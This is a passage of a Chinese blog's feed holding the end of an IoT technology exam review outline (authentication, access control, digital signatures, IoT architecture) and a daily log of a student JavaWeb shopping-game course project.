&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027589-1312243874.png&#34;
	width=&#34;883&#34;
	height=&#34;184&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027589-1312243874_hu17559073288760426709.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027589-1312243874_hu14863452515888570549.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151357028&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;479&#34;
		data-flex-basis=&#34;1151px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可能会出计算：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027827-1705567174.png&#34;
	width=&#34;852&#34;
	height=&#34;275&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027827-1705567174_hu12221083150520281835.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027827-1705567174_hu2438484376031983402.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151400234&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;309&#34;
		data-flex-basis=&#34;743px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4-p322云计算服务对密码设计的特殊需求&#34;&gt;4. [P322]云计算服务对密码设计的特殊需求。
&lt;/h2&gt;&lt;p&gt;需求：通过新型加密或扰动等方法对数据进行有效操作，以此来隐藏明文中的隐私信息，同时保证变换后数据仍能进行特定计算。&lt;/p&gt;
&lt;h2 id=&#34;5-p325身份认证的常见形式&#34;&gt;5. [P325]身份认证的常见形式。
&lt;/h2&gt;&lt;p&gt;常见形式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用户名/密码方式：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;智能卡认证&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;动态口令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;USB Key认证&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;生物识别&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;步态识别&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6p327-访问控制的基本概念和基本原则&#34;&gt;6.[P327] 访问控制的基本概念和基本原则。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本概念：在身份认证的基础上，依据授权对提出的资源访问请求加以控制。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基本原则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最小特权原则：用户所拥有的权利不超过他执行工作所需权限。&lt;/li&gt;
&lt;li&gt;多人负责原则：授权分散化，单人不能完成任务&lt;/li&gt;
&lt;li&gt;职责分离原则：不同责任分派不同的人以相互牵制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;7-p330数字签名的基本概念和实现过程&#34;&gt;7. [P330]数字签名的基本概念和实现过程。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本概念：用户用自己的私钥对原始数据的哈希摘要进行加密所得的数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实现过程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028113-1896258291.png&#34;
	width=&#34;883&#34;
	height=&#34;503&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028113-1896258291_hu13336902464891502053.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028113-1896258291_hu13725467634454207737.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151405941&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;175&#34;
		data-flex-basis=&#34;421px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;8-p331隐私保护的基本概念和实现方法&#34;&gt;8. [P331]隐私保护的基本概念和实现方法。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;隐私保护涉及两类信息标识：用户身份标识和位置信息标识。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;位置匿名技术：k-匿名、假位置、空间加密。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;押题&#34;&gt;押题
&lt;/h1&gt;&lt;h2 id=&#34;计算题&#34;&gt;计算题：
&lt;/h2&gt;&lt;h3 id=&#34;第二章一个&#34;&gt;第二章一个
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028424-115337731.png&#34;
	width=&#34;913&#34;
	height=&#34;221&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028424-115337731_hu8729618424005086314.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028424-115337731_hu12402725759501384594.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151415099&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;413&#34;
		data-flex-basis=&#34;991px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;第四章一个&#34;&gt;第四章一个
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028670-1408186598.png&#34;
	width=&#34;823&#34;
	height=&#34;618&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028670-1408186598_hu18143162716432056277.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028670-1408186598_hu14102212214355167652.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151429227&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;133&#34;
		data-flex-basis=&#34;319px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028924-216733082.png&#34;
	width=&#34;913&#34;
	height=&#34;229&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028924-216733082_hu8362456509331561886.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028924-216733082_hu15240492428445363229.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151435310&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;398&#34;
		data-flex-basis=&#34;956px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;浓缩版&#34;&gt;浓缩版（）
&lt;/h1&gt;&lt;p&gt;第一章&lt;/p&gt;
&lt;p&gt;1.物联网的体系架构和各层的功能及关键技术。&lt;/p&gt;
&lt;p&gt;物联网的4层体系结构：感知控制层、数据传输层、数据组织与管理层、应用决策层&lt;/p&gt;
&lt;p&gt;感知控制层（感知层）：它是物联网发展和应用的基础，由RFID读写器、智能传感节点和接入网关等组成。各种传感节点通过感知目标环境的相关信息，并自行组网传递到网关接入点，网关将收集到的数据通过互联网络提交到后台计算系统处理。后台计算系统处理的结果可以反馈到本层，作为实施动态控制的依据。&lt;/p&gt;
&lt;p&gt;数据传输层：主要负责通过各种接入设备实现互联网、短距离无线网络和移动通信网等不同类型的网络融合，实现物联网感知与控制数据的高效、安全、和可靠传输。还提供路由、格式转换、地址转换等功能。&lt;/p&gt;
&lt;p&gt;数据组织与管理层：提供物联网资源的初始化，监测资源的在线运行状况，协调多个物联网资源（计算资源、通信设备和感知设备等）之间的工作，实现跨域资源间的交互、共享与调度，实现感知数据的语义理解、推理、决策以及提供数据的查询、存储、分析、挖掘等。并利用云计算平台为感知数据的存储、分析提供支持。云计算平台是信息处理的重要部分，也是应用层各种应用的基础。&lt;/p&gt;
&lt;p&gt;应用决策层：物联网应用决策层利用经过分析处理的感知数据，为用户提供多种不同类型的服务，如检索、计算和推理等。物联网应用可分为监控型、控制型、扫描型等。&lt;/p&gt;
&lt;p&gt;物联网的3层体系结构：感知控制层、数据传输层、数据处理层。&lt;/p&gt;
&lt;p&gt;感知控制层：感知控制层作为物联网的核心层，主要用于物品标识和信息的智能采集，它由基本的感应器件以及感应器组成的网络两大部分组成。&lt;/p&gt;
&lt;p&gt;数据传输层：主要完成接入和传输功能，是进行信息交换、传递的数据通路，包括接入网与传输网。&lt;/p&gt;
&lt;p&gt;数据处理层：数据处理层由业务支撑平台、网络管理平台、信息处理平台、服务支撑平台等组成，完成协同、管理、计算、存储、分析、挖掘以及提供面向行业和大众用户的服务等功能。&lt;/p&gt;
&lt;p&gt;关键技术：&lt;/p&gt;
&lt;p&gt;感知层：传感器技术、条形码技术、RFID技术、EPC技术、移动定位技术&lt;/p&gt;
&lt;p&gt;第二章&lt;/p&gt;
&lt;p&gt;1.传感器的组成和各模块的功能。&lt;/p&gt;
&lt;p&gt;2.传感器的特性(静态和动态特性指标和物理意义)。&lt;/p&gt;
&lt;p&gt;3.电阻应变式、电感式和电容式传感器的工作原理(基本的公式推导)。&lt;/p&gt;
&lt;p&gt;第三章&lt;/p&gt;
&lt;p&gt;1.二五条码、交叉二五条码的编码规则。&lt;/p&gt;
&lt;p&gt;2.快速反应(QR)码的码结构和各部分的意义。&lt;/p&gt;
&lt;p&gt;3.射频识别(RFID)系统的组成和工作原理。&lt;/p&gt;
&lt;p&gt;4.两类定位技术(基于测距和非测距)的工作原理。&lt;/p&gt;
&lt;p&gt;第四章(结合PPT资料)&lt;/p&gt;
&lt;p&gt;1.物联网通信系统模型和各模块的功能。&lt;/p&gt;
&lt;p&gt;2.采样定理及物理意义。p143&lt;/p&gt;
&lt;p&gt;3.非均匀量化相比于均匀量化的优势及实现原理。p145&lt;/p&gt;
&lt;p&gt;4.无线传感器网络中MAC层的TRAMA协议和网络层的常见路由协议。p206 p208&lt;/p&gt;
&lt;p&gt;第五章&lt;/p&gt;
&lt;p&gt;1.分类的概念和常见的分类算法(基于人工神经网络)。p270&lt;/p&gt;
&lt;p&gt;2.聚类分析的概念和常见的聚类算法。p278&lt;/p&gt;
&lt;p&gt;第六章&lt;/p&gt;
&lt;p&gt;1.感知层安全中常见的物理安全机制和逻辑安全机制。p299&lt;/p&gt;
&lt;p&gt;物理安全机制：&lt;/p&gt;
&lt;p&gt;kill命令机制、电磁屏蔽、主动干扰、阻塞标签、可分离的标签&lt;/p&gt;
&lt;p&gt;kill命令机制：&lt;/p&gt;
&lt;p&gt;逻辑安全机制：&lt;/p&gt;
&lt;p&gt;散列锁定、临时ID、同步方法与协议、重加密、其他方法（基于PFU的方法、基于掩码的方法）&lt;/p&gt;
&lt;p&gt;2.现代密码学中DES算法(私钥密码体制)和RSA算法(公钥密码体制)的基本原理。p317&lt;/p&gt;
&lt;p&gt;3.访问控制的基本概念和基本原则。p327&lt;/p&gt;
&lt;p&gt;4.数字签名的基本概念和实现过程。p330&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【2022javaweb课设】基于购物系统的游戏原型设计</title>
        <link>https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/</link>
        <pubDate>Sat, 21 May 2022 14:23:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/</guid>
        <description>&lt;img src="https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/Welcome2.jpg" alt="Featured image of post 【2022javaweb课设】基于购物系统的游戏原型设计" /&gt;&lt;h2 id=&#34;会议记录&#34;&gt;会议记录
&lt;/h2&gt;&lt;h3 id=&#34;day1-2022520-晚&#34;&gt;Day1 2022/5/20 晚
&lt;/h3&gt;&lt;p&gt;确定小组成员。&lt;/p&gt;
&lt;p&gt;确定立项题目与方向：基于商城系统的游戏原型设计。&lt;/p&gt;
&lt;h3 id=&#34;day2-2022521-早&#34;&gt;Day2 2022/5/21 早
&lt;/h3&gt;&lt;h4 id=&#34;今日任务&#34;&gt;今日任务：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;确定开发环境&lt;/p&gt;
&lt;p&gt;前端：html+css+js,使用Bootstrap框架&lt;/p&gt;
&lt;p&gt;后端：MVC开发模式，JSP+JavaBean+Servlet&lt;/p&gt;
&lt;p&gt;Web应用服务器：tomcat 9.0.30&lt;/p&gt;
&lt;p&gt;数据库：MySQL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;功能需求分析&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;前端页面需求：
&lt;ol&gt;
&lt;li&gt;网站欢迎页面：介绍网站作用，提供登录和注册的窗口。&lt;/li&gt;
&lt;li&gt;注册和登录界面：传递用户信息到后端服务器与数据库交互。&lt;/li&gt;
&lt;li&gt;商店页面：作为主界面显示各种道具供玩家选择，提供进入战斗页面的入口，同时可以查看个人资料、购物车。&lt;/li&gt;
&lt;li&gt;个人资料页面：弹出展示，表现一些个人信息。&lt;/li&gt;
&lt;li&gt;购物车页面：弹窗展示，展示玩家已选择的道具与效果。&lt;/li&gt;
&lt;li&gt;战斗页面：游戏在该页面展示，玩家通过购买道具增强自己的属性或是削弱对手的属性，从而赢得胜利，进入下一关卡。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;后端需求：
&lt;ol&gt;
&lt;li&gt;设计数据库内容：
&lt;ol&gt;
&lt;li&gt;需要两个库，库PlayerAccount存放用户登陆数据与游戏数据，库GameSetting存放道具信息与敌人信息。&lt;/li&gt;
&lt;li&gt;库PlayerAccount中需要表players共一张表，表players中共number、name、password、hp、attack、defense，money七列。&lt;/li&gt;
&lt;li&gt;库GameSetting中需要prop、enemy两张表，表prop中共number、name、type、variation、cost五列，表enemy中共number、name、hp、attack、defense、gold五列。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;技术难点预处理&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;同页面内弹出小窗
&lt;ol&gt;
&lt;li&gt;使用Bootstrap框架实现模态框。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;servlet与jsp相互跳转时的路径
&lt;ol&gt;
&lt;li&gt;使用web.xml与绝对路径解决。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;熟悉使用Github的协同工作&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在Github上创建私人项目并邀请小组成员进入。&lt;/li&gt;
&lt;li&gt;小组使用Github Desktop图形化界面进行代码的协同工作。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;遗留问题&#34;&gt;遗留问题：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;将样例代码修改为所需代码。&lt;/li&gt;
&lt;li&gt;数据库更新，添加花费、金钱等重要选项。&lt;/li&gt;
&lt;li&gt;显示个人信息。&lt;/li&gt;
&lt;li&gt;购买道具后实现增益效果。&lt;/li&gt;
&lt;li&gt;开始着手对战。
&lt;ol&gt;
&lt;li&gt;界面构筑。&lt;/li&gt;
&lt;li&gt;玩家点击对战——提交数据到servlet——服务端返回数据——客户端表现完毕后结算。&lt;/li&gt;
&lt;li&gt;胜利则保存数据，失败则重新来过。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;day3-2022522&#34;&gt;Day3 2022/5/22
&lt;/h3&gt;&lt;h4 id=&#34;今日任务-1&#34;&gt;今日任务：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;修复昨日遗留bug。&lt;/li&gt;
&lt;li&gt;构建并丰富数据库表项。&lt;/li&gt;
&lt;li&gt;开始分析核心代码思路并编写。&lt;/li&gt;
&lt;li&gt;后端实现验证码注册登录、与数据库交互并实现保存登录信息。&lt;/li&gt;
&lt;li&gt;前端实现登录与主界面的实现与优化。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;未处理&#34;&gt;未处理：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;实现战斗&lt;/li&gt;
&lt;li&gt;实现购买&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;day4-2022523&#34;&gt;Day4 2022/5/23
&lt;/h3&gt;&lt;h4 id=&#34;今日任务-2&#34;&gt;今日任务：
&lt;/h4&gt;&lt;p&gt;战斗环节初步完成：&lt;/p&gt;
&lt;p&gt;战斗思路：用户登陆后创建一个临时tmpPlayer用来供玩家修改属性，每次战斗获得胜利后才会修改保存原本数据库中的数据，这样实现存档功能。&lt;/p&gt;
&lt;h4 id=&#34;未处理-1&#34;&gt;未处理：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;实现ajax传json，本地根据传值结果做出相应界面变化。&lt;/li&gt;
&lt;li&gt;按钮的开关操作。&lt;/li&gt;
&lt;li&gt;循环调用js，目的是为了点一次按钮就开始执行战斗环节。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;day5-2022524&#34;&gt;Day5 2022/5/24
&lt;/h3&gt;&lt;h4 id=&#34;今日任务-3&#34;&gt;今日任务：
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;现在开始使用bootstrap框架重构前端&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;index欢迎界面完成。&lt;/li&gt;
&lt;li&gt;注册与登录通过模态框实现。&lt;/li&gt;
&lt;li&gt;两个模态框分别刷新验证码，出错提示，重新打开刷新提示&lt;/li&gt;
&lt;li&gt;将注册与登录同欢迎页面在一起，使用ajax实现登录、注册以及登录状态保存。同时可以跳转到游戏主界面。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/1858293-20220604154345852-1297586329.png&#34;
	width=&#34;519&#34;
	height=&#34;630&#34;
	srcset=&#34;https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/1858293-20220604154345852-1297586329_hu9882075956850767550.png 480w, https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/1858293-20220604154345852-1297586329_hu12541126382259433949.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;逻辑&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;82&#34;
		data-flex-basis=&#34;197px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;遗留问题：注册失败&lt;/p&gt;
&lt;h3 id=&#34;day6-2022525&#34;&gt;Day6 2022/5/25
&lt;/h3&gt;&lt;h4 id=&#34;今日任务-4&#34;&gt;今日任务：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;url导入背景图片，改变其背景透明，透明度通过rgba（）实现。&lt;/li&gt;
&lt;li&gt;界面布局高度不一致，尝试用flex修改&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;day7-2022526&#34;&gt;Day7 2022/5/26
&lt;/h3&gt;&lt;h4 id=&#34;今日任务-5&#34;&gt;今日任务：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;完成装备的刷新机制。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;js获取div内容、克隆div，修改div各项属性及其子属性。、&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;装备刷新使用正态分布生成概率5% 12% 25% 28% 30%（线性）&lt;/p&gt;
&lt;p&gt;500 500&lt;del&gt;1700 1700&lt;/del&gt;4200 4200&lt;del&gt;7000 7000&lt;/del&gt;10000&lt;/p&gt;
&lt;p&gt;整体流程：Store.jsp-&amp;gt;GachaServlet-&amp;gt;DAO-&amp;gt;Servlet-&amp;gt;Store.jsp&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;day8-2022527&#34;&gt;Day8 2022/5/27
&lt;/h3&gt;&lt;h4 id=&#34;今日任务-6&#34;&gt;今日任务：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;重新编写了购买、修改购物车的逻辑&lt;/li&gt;
&lt;li&gt;添加刷新玩家信息的函数，请求玩家数据的方法。&lt;/li&gt;
&lt;li&gt;完成了战斗页面的构建，添加了逻辑。&lt;/li&gt;
&lt;li&gt;两侧card，中间是ui以及展示区域。&lt;/li&gt;
&lt;li&gt;完成PPT，完成视频展示，丰富数据库，找背景图以及怪物图。&lt;/li&gt;
&lt;li&gt;顺利完成答辩。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;最终界面&#34;&gt;最终界面：
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/%E6%AC%A2%E8%BF%8E%E9%A1%B5%E9%9D%A2.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/%E6%AC%A2%E8%BF%8E%E9%A1%B5%E9%9D%A2_hu17482875312594590690.png 480w, https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/%E6%AC%A2%E8%BF%8E%E9%A1%B5%E9%9D%A2_hu3318891287527836638.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;欢迎页面&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/%E5%95%86%E5%BA%97%E9%A1%B5%E9%9D%A2.png&#34;
	width=&#34;1920&#34;
	height=&#34;1080&#34;
	srcset=&#34;https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/%E5%95%86%E5%BA%97%E9%A1%B5%E9%9D%A2_hu13555428504231686975.png 480w, https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/%E5%95%86%E5%BA%97%E9%A1%B5%E9%9D%A2_hu4719192686265754263.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;商店页面&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/%E6%88%98%E6%96%97%E9%A1%B5%E9%9D%A2.png&#34;
	width=&#34;1899&#34;
	height=&#34;889&#34;
